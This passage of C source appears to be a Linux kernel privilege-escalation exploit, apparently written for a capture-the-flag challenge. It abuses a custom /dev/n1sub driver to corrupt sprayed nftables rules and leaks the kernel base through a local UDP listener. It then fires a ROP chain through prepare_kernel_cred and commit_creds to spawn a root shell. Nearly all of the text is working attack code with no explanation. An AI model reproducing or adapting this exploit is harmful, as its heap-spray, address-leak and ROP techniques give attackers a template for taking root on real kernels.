                          const char *chain_name, uint32_t rule_id,
                          size_t target_size, size_t target_off) {
  uint32_t portid, seq;
  struct mnl_nlmsg_batch *batch;
  struct nlmsghdr *nlh;
  int ret;
  char exploit_set_name[0x100];
  char *udata_buf[0x1000];
  struct nftnl_rule *rule;
  struct nftnl_expr *pad_meta_rule, *byteorder_expr, *payload_expr;
  size_t userdata_len;

  seq = time(NULL);
  batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  rule = nftnl_rule_alloc();
  if (rule == NULL) {
    die("nftnl_rule_alloc");
  }

  nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
  nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
  nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);

  size_t n_exprs = 0;
  size_t n_meta_pad;
  size_t tail_size =
      target_size - (target_off + 0x8 + 0x10); // the byteorder and payload
  target_off -= 0x18;                          // sizeof(struct nft_rule) itself
  //     target_size -
  //     (target_off + 0x8 + 0x10 +
  //      8); // the byteorder and payload and the last rule of nft_rule_dp
  // target_off -= 0x8; // sizeof(struct nft_rule_dp) itself
  if ((target_off & 0x8) == 0) {
    // bitwise_fast: size 0x18
    struct nftnl_expr *expr = nftnl_expr_alloc("bitwise");
    uint32_t mask = 0;
    uint32_t xor = 0;
    nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_LEN, 4);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_SREG, NFT_REG32_00);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_DREG, NFT_REG32_00);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_OP, NFT_BITWISE_BOOL);
    nftnl_expr_set(expr, NFTNL_EXPR_BITWISE_XOR, &mask, sizeof(mask));
    nftnl_expr_set(expr, NFTNL_EXPR_BITWISE_MASK, &xor, sizeof(xor));
    nftnl_rule_add_expr(rule, expr);
    n_exprs++;

    target_off -= 0x18;
  }
  n_meta_pad = target_off / 0x10;

  // for (int i = 0; i < n_imm_pad; i++) {
  //   imm_expr = nftnl_expr_alloc("immediate");
  //   nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_DREG, NFT_REG32_00);
  //   nftnl_expr_set_data(imm_expr, NFTNL_EXPR_IMM_DATA, zerobuf, 8);
  //   nftnl_rule_add_expr(rule, imm_expr);
  //   n_exprs++;
  // }

  // create head padding meta exprs
  for (int i = 0; i < n_meta_pad; i++) {
    pad_meta_rule = nftnl_expr_alloc("meta");
    if (pad_meta_rule == NULL) {
      die("nftnl_expr_alloc");
    }
    nftnl_expr_set_u32(pad_meta_rule, NFTNL_EXPR_META_KEY, NFT_META_PKTTYPE);
    nftnl_expr_set_u32(pad_meta_rule, NFTNL_EXPR_META_DREG, NFT_REG_1);
    nftnl_rule_add_expr(rule, pad_meta_rule);
    n_exprs++;
  }
  // add the byteorder expr
  byteorder_expr = nftnl_expr_alloc("byteorder");
  if (byteorder_expr == NULL) {
    die("nftnl_expr_alloc(byteorder_expr)");
  }
  nftnl_expr_set_u32(byteorder_expr, NFTNL_EXPR_BYTEORDER_OP,
                     NFT_BYTEORDER_HTON);
  // after sub, DREG will be NFT_REG32_01, SREG will be 0x82
  nftnl_expr_set_u32(byteorder_expr, NFTNL_EXPR_BYTEORDER_DREG, NFT_REG32_02);
  nftnl_expr_set_u32(byteorder_expr, NFTNL_EXPR_BYTEORDER_SREG, NFT_REG32_10);
  nftnl_expr_set_u32(byteorder_expr, NFTNL_EXPR_BYTEORDER_LEN, 8);
  nftnl_expr_set_u32(byteorder_expr, NFTNL_EXPR_BYTEORDER_SIZE, 8);
  nftnl_rule_add_expr(rule, byteorder_expr);
  n_exprs++;
  // add the payload expr, write the leaked value to the payload
  payload_expr = nftnl_expr_alloc("payload");
  if (payload_expr == NULL) {
    die("nftnl_expr_alloc");
  }
  nftnl_expr_set_u32(payload_expr, NFTNL_EXPR_PAYLOAD_BASE,
                     NFT_PAYLOAD_INNER_HEADER);
  nftnl_expr_set_u32(payload_expr, NFTNL_EXPR_PAYLOAD_OFFSET, 0);
  nftnl_expr_set_u32(payload_expr, NFTNL_EXPR_PAYLOAD_LEN, 8);
  nftnl_expr_set_u32(payload_expr, NFTNL_EXPR_PAYLOAD_CSUM_TYPE,
                     NFT_PAYLOAD_CSUM_NONE);
  nftnl_expr_set_u32(payload_expr, NFTNL_EXPR_PAYLOAD_SREG, NFT_REG32_01);
  nftnl_rule_add_expr(rule, payload_expr);

  n_meta_pad = tail_size / 0x10;
  userdata_len = tail_size % 0x10 - 1;
  // create tail padding meta exprs
  for (int i = 0; i < n_meta_pad; i++) {
    pad_meta_rule = nftnl_expr_alloc("meta");
    if (pad_meta_rule == NULL) {
      die("nftnl_expr_alloc");
    }
    nftnl_expr_set_u32(pad_meta_rule, NFTNL_EXPR_META_KEY, NFT_META_PKTTYPE);
    nftnl_expr_set_u32(pad_meta_rule, NFTNL_EXPR_META_DREG, NFT_REG_1);
    nftnl_rule_add_expr(rule, pad_meta_rule);
    n_exprs++;
  }

  // log("%ld exprs added", n_exprs);

  // userdata padding
  nftnl_rule_set_data(rule, NFTNL_RULE_USERDATA, nonzerobuf, userdata_len);

  nlh = nftnl_rule_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, NFPROTO_IPV4,
      NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rule);
  mnl_nlmsg_batch_next(batch);

  nftnl_rule_free(rule);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                        mnl_nlmsg_batch_size(batch)) < 0) {
    die("Cannot into mnl_socket_sendto()");
  }

  mnl_nlmsg_batch_stop(batch);
}
// }}}

// {{{ nft_create_rop_rule
void nft_create_rop_rule(struct mnl_socket *nl, const char *table_name,
                         const char *chain_name, uint32_t rule_id,
                         size_t target_size, size_t target_off) {
  uint32_t portid, seq;
  struct mnl_nlmsg_batch *batch;
  struct nlmsghdr *nlh;
  int ret;
  char exploit_set_name[0x100];
  char *udata_buf[0x1000];
  struct nftnl_rule *rule;
  struct nftnl_expr *pad_meta_rule, *byteorder_expr, *payload_expr, *imm_expr;
  size_t userdata_len;

  seq = time(NULL);
  batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  rule = nftnl_rule_alloc();
  if (rule == NULL) {
    die("nftnl_rule_alloc");
  }

  nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
  nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
  nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);

  size_t n_exprs = 0;
  size_t n_meta_pad;
  size_t tail_size = target_size - (target_off + 0x8); // the byteorder
  target_off -= 0x18; // sizeof(struct nft_rule) itself
  if ((target_off & 0x8) == 0) {
    // bitwise_fast: size 0x18
    struct nftnl_expr *expr = nftnl_expr_alloc("bitwise");
    uint32_t mask = 0;
    uint32_t xor = 0;
    nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_LEN, 4);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_SREG, NFT_REG32_00);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_DREG, NFT_REG32_00);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_OP, NFT_BITWISE_BOOL);
    nftnl_expr_set(expr, NFTNL_EXPR_BITWISE_XOR, &mask, sizeof(mask));
    nftnl_expr_set(expr, NFTNL_EXPR_BITWISE_MASK, &xor, sizeof(xor));
    nftnl_rule_add_expr(rule, expr);
    n_exprs++;

    target_off -= 0x18;
  }
  n_meta_pad = target_off / 0x10;
  n_meta_pad -= 2; // imm_expr

  // create head padding meta exprs
  for (int i = 0; i < n_meta_pad; i++) {
    pad_meta_rule = nftnl_expr_alloc("meta");
    if (pad_meta_rule == NULL) {
      die("nftnl_expr_alloc");
    }
    nftnl_expr_set_u32(pad_meta_rule, NFTNL_EXPR_META_KEY, NFT_META_PKTTYPE);
    nftnl_expr_set_u32(pad_meta_rule, NFTNL_EXPR_META_DREG, NFT_REG_1);
    nftnl_rule_add_expr(rule, pad_meta_rule);
    n_exprs++;
  }

  imm_expr = nftnl_expr_alloc("immediate");
  if (imm_expr == NULL) {
    die("nftnl_expr_alloc");
  }
  nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_DREG, NFT_REG32_01);
  int offset = 0x6800; // after NTOH will be 0x0068
  nftnl_expr_set_data(imm_expr, NFTNL_EXPR_IMM_DATA, &offset, sizeof(offset));
  nftnl_rule_add_expr(rule, imm_expr);
  n_exprs++;

  // add the byteorder expr
  byteorder_expr = nftnl_expr_alloc("byteorder");
  if (byteorder_expr == NULL) {
    die("nftnl_expr_alloc(byteorder_expr)");
  }
  // after sub, DREG will be 22, SREG will be 9, OP will be NFT_BYTEORDER_NTOH
  // 0x010404 -> 0x001605 need sub 0xedff
  nftnl_expr_set_u32(byteorder_expr, NFTNL_EXPR_BYTEORDER_OP,
                     NFT_BYTEORDER_HTON);
  nftnl_expr_set_u32(byteorder_expr, NFTNL_EXPR_BYTEORDER_DREG, NFT_REG32_00);
  nftnl_expr_set_u32(byteorder_expr, NFTNL_EXPR_BYTEORDER_SREG, NFT_REG32_00);
  nftnl_expr_set_u32(byteorder_expr, NFTNL_EXPR_BYTEORDER_LEN, 2);
  nftnl_expr_set_u32(byteorder_expr, NFTNL_EXPR_BYTEORDER_SIZE, 2);
  nftnl_rule_add_expr(rule, byteorder_expr);
  n_exprs++;
  // // add the payload expr, write the leaked value to the payload
  // payload_expr = nftnl_expr_alloc("payload");
  // if (payload_expr == NULL) {
  //   die("nftnl_expr_alloc");
  // }
  // nftnl_expr_set_u32(payload_expr, NFTNL_EXPR_PAYLOAD_BASE,
  //                    NFT_PAYLOAD_INNER_HEADER);
  // nftnl_expr_set_u32(payload_expr, NFTNL_EXPR_PAYLOAD_OFFSET, 0);
  // nftnl_expr_set_u32(payload_expr, NFTNL_EXPR_PAYLOAD_LEN, 8);
  // nftnl_expr_set_u32(payload_expr, NFTNL_EXPR_PAYLOAD_CSUM_TYPE,
  //                    NFT_PAYLOAD_CSUM_NONE);
  // nftnl_expr_set_u32(payload_expr, NFTNL_EXPR_PAYLOAD_SREG, NFT_REG32_01);
  // nftnl_rule_add_expr(rule, payload_expr);

  n_meta_pad = tail_size / 0x10;
  userdata_len = tail_size % 0x10 - 1;
  // create tail padding meta exprs
  for (int i = 0; i < n_meta_pad; i++) {
    pad_meta_rule = nftnl_expr_alloc("meta");
    if (pad_meta_rule == NULL) {
      die("nftnl_expr_alloc");
    }
    nftnl_expr_set_u32(pad_meta_rule, NFTNL_EXPR_META_KEY, NFT_META_PKTTYPE);
    nftnl_expr_set_u32(pad_meta_rule, NFTNL_EXPR_META_DREG, NFT_REG_1);
    nftnl_rule_add_expr(rule, pad_meta_rule);
    n_exprs++;
  }

  // log("%ld exprs added", n_exprs);

  // userdata padding
  nftnl_rule_set_data(rule, NFTNL_RULE_USERDATA, nonzerobuf, userdata_len);

  nlh = nftnl_rule_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, NFPROTO_IPV4,
      NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rule);
  mnl_nlmsg_batch_next(batch);

  nftnl_rule_free(rule);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                        mnl_nlmsg_batch_size(batch)) < 0) {
    die("Cannot into mnl_socket_sendto()");
  }

  mnl_nlmsg_batch_stop(batch);
}
// }}}

// {{{ delete_chain
void delete_chain(struct mnl_socket *nl, const char *table_name,
                  const char *chain_name) {

  struct mnl_nlmsg_batch *batch;
  char buf[MNL_SOCKET_BUFFER_SIZE];
  struct nlmsghdr *nlh;
  uint32_t portid, seq, chain_seq;
  struct nftnl_chain *t;
  int ret;

  seq = time(NULL);
  batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  chain_seq = seq;

  t = nftnl_chain_alloc();
  if (t == NULL) {
    die("OOM");
  }
  nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
  nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);

  nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN,
                              NFPROTO_IPV4, NLM_F_ACK, seq++);
  nftnl_chain_nlmsg_build_payload(nlh, t);

  nftnl_chain_free(t);
  mnl_nlmsg_batch_next(batch);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                        mnl_nlmsg_batch_size(batch)) < 0) {
    perror("mnl_socket_send");
    exit(EXIT_FAILURE);
  }

  mnl_nlmsg_batch_stop(batch);

  portid = mnl_socket_get_portid(nl);
  ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
  while (ret > 0) {
    ret = mnl_cb_run(buf, ret, chain_seq, portid, NULL, NULL);
    if (ret <= 0)
      break;
    ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
  }
  if (ret == -1) {
    // die("error in delete_chain");
  }
}
// }}}

static int n1sub_fd;

void n1sub_add(size_t *size, size_t *off) {
  size_t _size = ioctl(n1sub_fd, N1SUB_ADD, off);
  if (size != NULL) {
    *size = _size;
  }
}

void n1sub_free(int nth) { ioctl(n1sub_fd, N1SUB_FREE, nth); }

void n1sub_dosub(int nth) { ioctl(n1sub_fd, N1SUB_DOSUB, nth); }

static int roprule_corrupt_cb(const struct nlmsghdr *nlh, void *corrupted) {
  struct nftnl_rule *t;
  char buf[4096];

  t = nftnl_rule_alloc();
  if (t == NULL) {
    die("nftnl_rule_alloc");
  }

  if (nftnl_rule_nlmsg_parse(nlh, t) < 0) {
    die("nftnl_rule_nlmsg_parse");
  }

  nftnl_rule_snprintf(buf, sizeof(buf), t, NFTNL_OUTPUT_DEFAULT, 0);
  if (strstr(buf, "byteorder") == NULL) {
    die("rule add failed");
  }
  if (strstr(buf, "byteorder reg 18 = hton(reg 10, 2, 2)") == NULL) {
    *(int *)corrupted = 1;
    printf("%s\n", buf);
  } else {
    *(int *)corrupted = 0;
  }

  return MNL_CB_OK;
}

static int leakrule_corrupt_cb(const struct nlmsghdr *nlh, void *corrupted) {
  struct nftnl_rule *t;
  char buf[4096];

  t = nftnl_rule_alloc();
  if (t == NULL) {
    die("nftnl_rule_alloc");
  }

  if (nftnl_rule_nlmsg_parse(nlh, t) < 0) {
    die("nftnl_rule_nlmsg_parse");
  }

  nftnl_rule_snprintf(buf, sizeof(buf), t, NFTNL_OUTPUT_DEFAULT, 0);
  if (strstr(buf, "byteorder") == NULL) {
    die("rule add failed");
  }
  if (strstr(buf, "byteorder reg 10 = hton(reg 18, 8, 8)") == NULL) {
    *(int *)corrupted = 1;
    printf("%s\n", buf);
  } else {
    *(int *)corrupted = 0;
  }

  return MNL_CB_OK;
}

int leak_handler(int fd, int pipe_fd) {
  char buf[4096] = {};
  char send_back[] = "MSG_OK";
  struct sockaddr_in client_addr = {};
  socklen_t client_addr_size = sizeof client_addr;
  size_t conn_id = 0;

  for (;;) {
    log("wait for input");
    int len = recvfrom(fd, buf, sizeof buf - 1, 0,
                       (struct sockaddr *)&client_addr, &client_addr_size);
    if (len <= 0)
      die("listener receive failed..\n");
    hexdump(buf, len, 40);
    size_t kernel_addr = htobe64(((size_t *)buf)[0]);
    log("kernel_addr: 0x%lx", kernel_addr);
    if (kernel_addr > 0xffffffff00000000) {
      size_t kernel_base =
          (kernel_addr - NFT_DO_CHAIN_IPV4) & 0xFFFFFFFFFFFFF000;
      log("leak done!");
      write(pipe_fd, &kernel_base, sizeof(kernel_base));
    }
  }

  close(fd);
  return 0;
}

#define SERVER_HOST "127.0.0.1"
#define SERVER_PORT 9999

struct nft_rule_dp {
  uint64_t is_last : 1, dlen : 12, handle : 42; /* for tracing */
  unsigned char data[];
};

typedef uint8_t u8;

struct nft_payload_set {
  enum nft_payload_bases base : 8;
  u8 offset;
  u8 len;
  u8 sreg;
  u8 csum_type;
  u8 csum_offset;
  u8 csum_flags;
};

struct nft_payload {
  enum nft_payload_bases base : 8;
  u8 offset;
  u8 len;
  u8 dreg;
};

void pin_cpu0() {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(0, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
}

void get_root() { system("/bin/sh"); }

int main() {
  struct mnl_socket *nl;
  int nbytes;
  char buf[0x1000];
  char corrupted_chain_name[0x10];
  int rule_corrupted = 0;
  char base_chain[0x10];
  // create user namespace
  get_user_stat();
  unshare_setup(getuid(), getgid());

  pin_cpu0();

  // add net dev
  system("ip addr add 127.0.0.1/8 dev lo");
  system("ip link set lo up");

  // create netlink socket
  nl = mnl_socket_open(NETLINK_NETFILTER);
  if (nl == NULL) {
    die("mnl_socket_open()");
  }
  if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
    die("mnl_socket_bind()");
  }
  prepare_nft(nl);

  n1sub_fd = open("/dev/n1sub", O_RDONLY);
  if (n1sub_fd < 0) {
    die("failed to open /dev/n1sub");
  }

  size_t target_size = 0, target_off = 0;
  for (int i = 0; i < N_SUB_SPRAY; i++) {
    n1sub_add(&target_size, &target_off);
  }
  log("Got size: %lx off: %lx", target_size, target_off);

  memset(buf, 'A', sizeof(buf));
  for (int i = 0; i < N_SUB_SPRAY; i++) {
    n1sub_free(0);
  }

  for (int i = 0; i < N_RULE_SPRAY; i++) {
    char chain_name[0x10];
    LEAKCHAIN(i, chain_name);
    nft_create_leak_rule(nl, "n1subtbl", chain_name, i, target_size,
                         target_off);
  }

  for (int i = 0; i < N_SUB_SPRAY; i++) {
    for (int j = 0; j < 0x8c; j++) {
      n1sub_dosub(i);
    }
  }

  for (int i = 0; i < N_RULE_SPRAY; i++) {
    LEAKCHAIN(i, corrupted_chain_name);
    int corrupted;
    dump_rule("n1subtbl", corrupted_chain_name, NFPROTO_IPV4,
              leakrule_corrupt_cb, &corrupted);
    if (corrupted) {
      log("found corrupted rule in chain: %s", corrupted_chain_name);
      rule_corrupted = 1;
      break;
    }
  }
  if (!rule_corrupted) {
    die("failed to corrupt rule..");
  }

  nft_create_append_rule(nl, "n1subtbl", corrupted_chain_name);

  BASECHAIN(0, base_chain);
  nft_create_base_rule(nl, "n1subtbl", base_chain, corrupted_chain_name, 0);

  int pipe_fds[2];
  pipe(pipe_fds);
  int pid = setup_listener(SERVER_HOST, SERVER_PORT, leak_handler, pipe_fds[1]);
  struct sockaddr_in magic_addr;
  inet_aton(SERVER_HOST, &magic_addr.sin_addr);
  magic_addr.sin_port = htons(SERVER_PORT);
  magic_addr.sin_family = AF_INET;
  int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  sendto(s, zerobuf, 0x100, 0, &magic_addr, sizeof(magic_addr));
  size_t kernel_base;
  read(pipe_fds[0], &kernel_base, sizeof(kernel_base));
  if (kernel_base == 0) {
    die("failed to leak..");
  }
  log("leaked kernel_base: 0x%lx", kernel_base);
  stop_listener(pid);

  BASECHAIN(0, base_chain);
  delete_chain(nl, "n1subtbl", base_chain);

  // make the rop rules
  for (int i = N_SUB_SPRAY; i < 2 * N_SUB_SPRAY; i++) {
    n1sub_add(NULL, NULL);
  }
  for (int i = N_SUB_SPRAY; i < 2 * N_SUB_SPRAY; i++) {
    n1sub_free(i);
  }
  for (int i = 0; i < N_RULE_SPRAY; i++) {
    char chain_name[0x10];
    ROPCHAIN(i, chain_name);
    nft_create_rop_rule(nl, "n1subtbl", chain_name, i, target_size, target_off);
  }

  for (int i = N_SUB_SPRAY; i < 2 * N_SUB_SPRAY; i++) {
    for (int j = 0; j < 0xedff; j++) {
      n1sub_dosub(i);
    }
  }

  for (int i = 0; i < N_RULE_SPRAY; i++) {
    ROPCHAIN(i, corrupted_chain_name);
    int corrupted;
    dump_rule("n1subtbl", corrupted_chain_name, NFPROTO_IPV4,
              roprule_corrupt_cb, &corrupted);
    if (corrupted) {
      log("found corrupted rule in chain: %s", corrupted_chain_name);
      rule_corrupted = 1;
      break;
    }
  }
  if (!rule_corrupted) {
    die("failed to corrupt rule..");
  }

  nft_create_append_rule(nl, "n1subtbl", corrupted_chain_name);

  BASECHAIN(1, base_chain);
  size_t fake_expr[4];
  struct nft_rule_dp *fake_dp = (struct nft_rule_dp *)fake_expr;
  fake_dp->dlen = 0x18;
  fake_expr[1] = kernel_base + NFT_PAYLOAD_OPS_OFF;
  fake_expr[3] = kernel_base + NFT_META_GET_OPS_OFF;
  struct nft_payload *fake_nft_payload = (void *)&fake_expr[2];
  fake_nft_payload->len = 0xf0;
  fake_nft_payload->base = NFT_PAYLOAD_INNER_HEADER;
  fake_nft_payload->offset = 0;
  fake_nft_payload->dreg = 0x8e;
  nft_create_rop_base_rule(nl, "n1subtbl", base_chain, corrupted_chain_name,
                           fake_expr);
  // add some pad to make the blob_gen of the chain will have > 32k size
  for (int i = 0; i < 32; i++) {
    nft_create_rop_base_padding_rule(nl, "n1subtbl", base_chain);
  }

  inet_aton(SERVER_HOST, &magic_addr.sin_addr);
  magic_addr.sin_port = htons(SERVER_PORT);
  magic_addr.sin_family = AF_INET;
  size_t rop[0x100], nth_rop = 0;
#define ROP(x) rop[nth_rop++] = (x)
  ROP(POP_RDI_RET + kernel_base);
  ROP(0);
  ROP(PREPARE_KERNEL_CRED + kernel_base);
  ROP(POP_RDI_RET + kernel_base);
  ROP(0);
  ROP(TEST_RDI_RET + kernel_base);
  ROP(MOV_RDI_RAX_JNE_RET + kernel_base);
  ROP(COMMIT_CREDS + kernel_base);
  ROP(swapgs_restore_regs_and_return_to_usermode + kernel_base);
  ROP(0);
  ROP(0);
  ROP((size_t)&get_root);
  ROP(user_cs);
  ROP(user_rflags);
  ROP(user_rsp + 0x8);
  ROP(user_ss);
  // trigger the rop
  sendto(s, rop, 0x100, 0, &magic_addr, sizeof(magic_addr));

  system("/bin/sh");

  // sleep(100);
  // do heap spray
}

// vim:foldmethod=marker
